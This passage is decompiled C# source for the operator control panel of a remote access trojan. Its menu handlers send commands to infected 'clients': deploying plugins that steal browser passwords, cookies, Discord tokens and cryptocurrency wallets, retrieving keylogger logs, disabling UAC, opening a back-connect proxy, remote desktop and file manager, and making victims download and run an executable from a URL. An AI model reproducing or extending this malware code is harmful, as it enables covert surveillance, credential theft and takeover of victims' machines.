				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600012B RID: 299 RVA: 0x00012020 File Offset: 0x00010220
		private void webToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string defaultResponse = "http://www.example.com/server.exe";
				string text = Interaction.InputBox("The Url", "To Url", defaultResponse, -1, -1);
				string defaultResponse2 = "server.exe";
				string text2 = Interaction.InputBox("The File Name", "File Name", defaultResponse2, -1, -1);
				if (!(text.Length == 0 | text2.Length == 0))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "weburl";
					msgPack.ForcePathObject("link").AsString = text;
					msgPack.ForcePathObject("Ext").AsString = text2;
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600012C RID: 300 RVA: 0x0000272E File Offset: 0x0000092E
		private void cLEARToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			this.listBox1.Items.Clear();
		}

		// Token: 0x0600012D RID: 301 RVA: 0x00012104 File Offset: 0x00010304
		private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string defaultResponse = "AnyDesk,Getscreen";
				string text = Interaction.InputBox("Process Name", "Kill Process", defaultResponse, -1, -1);
				if (text.Length != 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "killps";
					msgPack.ForcePathObject("PS").AsString = text;
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600012E RID: 302 RVA: 0x000121A8 File Offset: 0x000103A8
		private void startToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			using (Proxy proxy = new Proxy())
			{
				if (proxy.ShowDialog() == DialogResult.OK && this.listView1.SelectedItems.Count > 0)
				{
					try
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Packet").AsString = "backproxy";
						msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\BackProxy.dll")));
						msgPack.ForcePathObject("Host").AsString = proxy.textBox1.Text;
						msgPack.ForcePathObject("Port").AsString = proxy.numericUpDown1.Value.ToString();
						Clients[] selectedClients = this.GetSelectedClients();
						for (int i = 0; i < selectedClients.Length; i++)
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
						}
						new HandleLogs().Addmsg("Sending Backproxy.dll..", Color.Black);
						this.tabControl1.SelectedIndex = 1;
					}
					catch (Exception ex)
					{
						MessageBox.Show(ex.Message);
					}
				}
			}
		}

		// Token: 0x0600012F RID: 303 RVA: 0x000122E0 File Offset: 0x000104E0
		private void stopToolStripMenuItem3_Click_1(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "KillProxy";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Backproxy.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending Backproxy.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000130 RID: 304 RVA: 0x00012398 File Offset: 0x00010598
		private void offlineToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "klget";
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000131 RID: 305 RVA: 0x0001241C File Offset: 0x0001061C
		private void gOTOToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.listView1.SelectedItems)
				{
					((ListViewItem)obj).Selected = false;
				}
			}
			catch (Exception)
			{
			}
			try
			{
				string text = this.listBox1.SelectedItem.ToString();
				string b = text.Split(new string[]
				{
					":"
				}, StringSplitOptions.RemoveEmptyEntries)[0] + ":" + text.Split(new string[]
				{
					":"
				}, StringSplitOptions.RemoveEmptyEntries)[1];
				foreach (object obj2 in this.listView1.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj2;
					if (listViewItem.SubItems[this.lv_ip.Index].Text == b)
					{
						listViewItem.Selected = true;
					}
				}
				this.tabControl1.SelectedIndex = 0;
				this.listView1.EnsureVisible(this.listView1.SelectedItems[0].Index);
				Clipboard.SetText(this.listView1.SelectedItems[0].SubItems[5].Text);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000132 RID: 306 RVA: 0x000125E0 File Offset: 0x000107E0
		private void gETLOGSToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView4.Items.Count > 0)
				{
					//using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					//{
					//	while (enumerator.MoveNext())
					//	{
					//		if (((ListViewItem)enumerator.Current).Text == "Get Keylogger")
					//		{
					//			return;
					//		}
					//	}
					//}
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "klget";
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "Get Keylogger";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				this.listView4.Items.Add(listViewItem);
				this.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				this.getTasks.Add(new AsyncTask(msgPack.Encode2Bytes(), listViewItem.ToolTipText));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000133 RID: 307 RVA: 0x0001270C File Offset: 0x0001090C
		private void backProxyUIToolStripMenuItem_Click(object sender, EventArgs e)
		{
			//object obj = Interaction.InputBox("Set Port", "ProxyListenerStart", Settings.Default.proxyport, -1, -1);
			//if (string.IsNullOrWhiteSpace(obj.ToString()))
			//{
			//	return;
			//}
			try
			{
				foreach (Process process in Process.GetProcesses())
				{
					try
					{
						if (process.ProcessName == "BackProxyUI")
						{
							process.Kill();
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
			try
			{
				Process.Start(new Process
				{
					StartInfo = 
					{
						FileName = "BackProxyUI.exe",
						//Arguments = obj.ToString()
					}
				}.StartInfo);
				//Settings.Default.proxyport = obj.ToString();
				//Settings.Default.Save();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000134 RID: 308 RVA: 0x00012804 File Offset: 0x00010A04
		private void toUACToolStripMenuItem_Click(object sender, EventArgs e)
		{
			//Form1.<toUACToolStripMenuItem_Click>d__89 <toUACToolStripMenuItem_Click>d__;
			//<toUACToolStripMenuItem_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			//<toUACToolStripMenuItem_Click>d__.<>4__this = this;
			//<toUACToolStripMenuItem_Click>d__.<>1__state = -1;
			//<toUACToolStripMenuItem_Click>d__.<>t__builder.Start<Form1.<toUACToolStripMenuItem_Click>d__89>(ref <toUACToolStripMenuItem_Click>d__);
		}

		// Token: 0x06000135 RID: 309 RVA: 0x0001283C File Offset: 0x00010A3C
		private void passwordRecoveryToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "plugin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending Password Recovery.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000136 RID: 310 RVA: 0x000128EC File Offset: 0x00010AEC
		private void dicordTokensToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "DicordTokens";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\DicordTokens.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending DicordTokens.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000137 RID: 311 RVA: 0x00002287 File Offset: 0x00000487
		private void webBrowserPassViewToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000138 RID: 312 RVA: 0x000129A4 File Offset: 0x00010BA4
		private void disableUACToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "uacoff";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\UACOFF.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending UACOFF.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000139 RID: 313 RVA: 0x00012A5C File Offset: 0x00010C5C
		private void showFolderToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				Clients[] selectedClients = this.GetSelectedClients();
				if (selectedClients.Length == 0)
				{
					Process.Start(Application.StartupPath);
				}
				else
				{
					foreach (Clients clients in selectedClients)
					{
						string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + clients.ID);
						if (Directory.Exists(text))
						{
							Process.Start(text);
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600013A RID: 314 RVA: 0x00012AE4 File Offset: 0x00010CE4
		private void allInOneRecoveryToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "passload";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\All-In-One.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending All-In-One Recovery.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600013B RID: 315 RVA: 0x00012B9C File Offset: 0x00010D9C
		private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.listView1.SelectedItems)
				{
					((ListViewItem)obj).Selected = false;
				}
			}
			catch (Exception)
			{
			}
			try
			{
				string text = this.listBox1.SelectedItem.ToString();
				string b = text.Split(new string[]
				{
					":"
				}, StringSplitOptions.RemoveEmptyEntries)[0] + ":" + text.Split(new string[]
				{
					":"
				}, StringSplitOptions.RemoveEmptyEntries)[1];
				foreach (object obj2 in this.listView1.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj2;
					if (listViewItem.SubItems[this.lv_ip.Index].Text == b)
					{
						listViewItem.Selected = true;
					}
				}
				this.remoteDesktopToolStripMenuItem1.PerformClick();
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600013C RID: 316 RVA: 0x00012CE8 File Offset: 0x00010EE8
		private void hiddenAnydeskToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			//Form1.<hiddenAnydeskToolStripMenuItem_Click_1>d__97 <hiddenAnydeskToolStripMenuItem_Click_1>d__;
			//<hiddenAnydeskToolStripMenuItem_Click_1>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			//<hiddenAnydeskToolStripMenuItem_Click_1>d__.<>4__this = this;
			//<hiddenAnydeskToolStripMenuItem_Click_1>d__.<>1__state = -1;
			//<hiddenAnydeskToolStripMenuItem_Click_1>d__.<>t__builder.Start<Form1.<hiddenAnydeskToolStripMenuItem_Click_1>d__97>(ref <hiddenAnydeskToolStripMenuItem_Click_1>d__);
		}

		// Token: 0x0600013D RID: 317 RVA: 0x00012D20 File Offset: 0x00010F20
		private void remoteDesktopToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "plugin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteDesktop.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + clients.ID] == null)
					{
						new FormRemoteDesktop
						{
							Name = "RemoteDesktop:" + clients.ID,
							F = this,
							Text = "RemoteDesktop:" + clients.ID,
							ParentClient = clients,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "RemoteDesktop")
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600013E RID: 318 RVA: 0x00012E40 File Offset: 0x00011040
		private void fileManagerToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "plugin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileManager.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormFileManager)Application.OpenForms["fileManager:" + clients.ID] == null)
					{
						new FormFileManager
						{
							Name = "fileManager:" + clients.ID,
							Text = "fileManager:" + clients.ID,
							F = this,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID)
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600013F RID: 319 RVA: 0x00012F54 File Offset: 0x00011154
		private void webBrowserPassViewToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "WebBrowserPass";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\PasswordNew.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending PasswordNew.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000140 RID: 320 RVA: 0x0001300C File Offset: 0x0001120C
		private void walletsToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "Wallets";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Wallets.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending Wallets.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000141 RID: 321 RVA: 0x000130C4 File Offset: 0x000112C4
		private void walletsToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView4.Items.Count > 0)
				{
					//using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					//{
					//	while (enumerator.MoveNext())
					//	{
					//		if (((ListViewItem)enumerator.Current).Text == "Wallets")
					//		{
					//			return;
					//		}
					//	}
					//}
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "Wallets";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Wallets.dll")));
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "Wallets";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				this.listView4.Items.Add(listViewItem);
				this.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				this.getTasks.Add(new AsyncTask(msgPack.Encode2Bytes(), listViewItem.ToolTipText));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000142 RID: 322 RVA: 0x00013228 File Offset: 0x00011428
		private void searchToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("HWID", "Search HWID", "", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					try
					{
						foreach (object obj in this.listView1.SelectedItems)
						{
							((ListViewItem)obj).Selected = false;
						}
					}
					catch (Exception)
					{
					}
					foreach (object obj2 in this.listView1.Items)
					{
						ListViewItem listViewItem = (ListViewItem)obj2;
						if (listViewItem.SubItems[this.lv_hwid.Index].Text == text)
						{
							listViewItem.Selected = true;
						}
					}
					this.listView1.EnsureVisible(this.listView1.SelectedItems[0].Index);
					if (this.listView1.SelectedItems.Count < 1)
					{
						MessageBox.Show("Not Found!", this.Text);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000143 RID: 323 RVA: 0x000133B4 File Offset: 0x000115B4
		private void clearToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				object lockListviewLogs = Settings.LockListviewLogs;
				lock (lockListviewLogs)
				{
					this.listView5.Items.Clear();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000144 RID: 324 RVA: 0x00013418 File Offset: 0x00011618
		private void copyIDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				Clipboard.SetText(this.listView5.SelectedItems[0].SubItems[0].Text);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000145 RID: 325 RVA: 0x00013460 File Offset: 0x00011660
		private void gOTOToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.listView1.SelectedItems)
				{
					((ListViewItem)obj).Selected = false;
				}
			}
			catch (Exception)
			{
			}
			try
			{
				string text = this.listView5.SelectedItems[0].SubItems[0].Text;
				foreach (object obj2 in this.listView1.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj2;
					if (listViewItem.SubItems[this.lv_hwid.Index].Text == text)
					{
						listViewItem.Selected = true;
					}
				}
				this.listView1.EnsureVisible(this.listView1.SelectedItems[0].Index);
				this.tabControl1.SelectedIndex = 0;
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000146 RID: 326 RVA: 0x00002287 File Offset: 0x00000487
		private void listView1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000147 RID: 327 RVA: 0x000135A0 File Offset: 0x000117A0
		private void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.listView5.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					bool flag = false;
					foreach (object obj2 in this.listView1.Items)
					{
						ListViewItem listViewItem2 = (ListViewItem)obj2;
						if (listViewItem.SubItems[0].Text == listViewItem2.SubItems[this.lv_hwid.Index].Text)
						{
							flag = true;
						}
					}
					if (!flag)
					{
						listViewItem.Remove();
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000148 RID: 328 RVA: 0x00002287 File Offset: 0x00000487
		private void rENAMEToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000149 RID: 329 RVA: 0x00002287 File Offset: 0x00000487
		private void searchHWIDToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600014A RID: 330 RVA: 0x000136A0 File Offset: 0x000118A0
		private void searchHWIDToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("HWID", "Search HWID", "", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					try
					{
						foreach (object obj in this.listView5.SelectedItems)
						{
							((ListViewItem)obj).Selected = false;
						}
					}
					catch (Exception)
					{
					}
					foreach (object obj2 in this.listView5.Items)
					{
						ListViewItem listViewItem = (ListViewItem)obj2;
						if (listViewItem.SubItems[0].Text == text)
						{
							listViewItem.Selected = true;
						}
					}
					this.listView5.EnsureVisible(this.listView5.SelectedItems[0].Index);
					if (this.listView5.SelectedItems.Count < 1)
					{
						MessageBox.Show("Not Found!", this.Text);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600014B RID: 331 RVA: 0x00013820 File Offset: 0x00011A20
		private void fireFoxCookiesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "Fox";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\FPLCookies.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending FPLCookies.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600014C RID: 332 RVA: 0x000138D8 File Offset: 0x00011AD8
		private void chromiumCookiesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "Chrome";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\ChromiumCookies.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending ChromiumCookies.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600014D RID: 333 RVA: 0x00002287 File Offset: 0x00000487
		private void blockSiteToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600014E RID: 334 RVA: 0x00013990 File Offset: 0x00011B90
		private void blockToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string asString = Interaction.InputBox("Set Website", "BlockSite", "", -1, -1);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "Block";
				msgPack.ForcePathObject("site").AsString = asString;
				msgPack.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600014F RID: 335 RVA: 0x00002287 File Offset: 0x00000487
		private void monitoringToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000150 RID: 336 RVA: 0x00013A44 File Offset: 0x00011C44
		private void resetToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "ResetHosts";
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000151 RID: 337 RVA: 0x00013AB0 File Offset: 0x00011CB0
		private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (Sites sites = new Sites())
			{
				sites.ShowDialog();
			}
		}

		// Token: 0x06000152 RID: 338 RVA: 0x00013AE8 File Offset: 0x00011CE8
		private void newsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "WebBrowserPass";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\PasswordNew.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending WebBrowserPass.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000153 RID: 339 RVA: 0x00013BA0 File Offset: 0x00011DA0
		private void toolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "WebBrowserPass";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\WebBrowserPass.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending WebBrowserPass.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000154 RID: 340 RVA: 0x00013C58 File Offset: 0x00011E58
		private void saToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			Random random = new Random();
			this.listView1.BackColor = Color.FromArgb(random.Next(0, 256), random.Next(0, 256), 0);
			this.listView1.ForeColor = Color.FromArgb(random.Next(0, 256), random.Next(0, 256), 0);
			this.BackColor = Color.FromArgb(random.Next(0, 256), random.Next(0, 256), 0);
		}

		// Token: 0x06000155 RID: 341 RVA: 0x00002740 File Offset: 0x00000940
		private void backToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.listView1.ForeColor = Color.Black;
			this.listView1.BackColor = Color.White;
			this.BackColor = Color.White;
		}

		// Token: 0x04000059 RID: 89
		private bool trans;

		// Token: 0x0400005A RID: 90
		public cGeoMain cGeoMain = new cGeoMain();

		// Token: 0x0400005B RID: 91
		private List<AsyncTask> getTasks = new List<AsyncTask>();

		// Token: 0x0400005C RID: 92
		private ListViewColumnSorter lvwColumnSorter;

		// Token: 0x0400005D RID: 93
		private readonly FormDOS formDOS;
	}
}
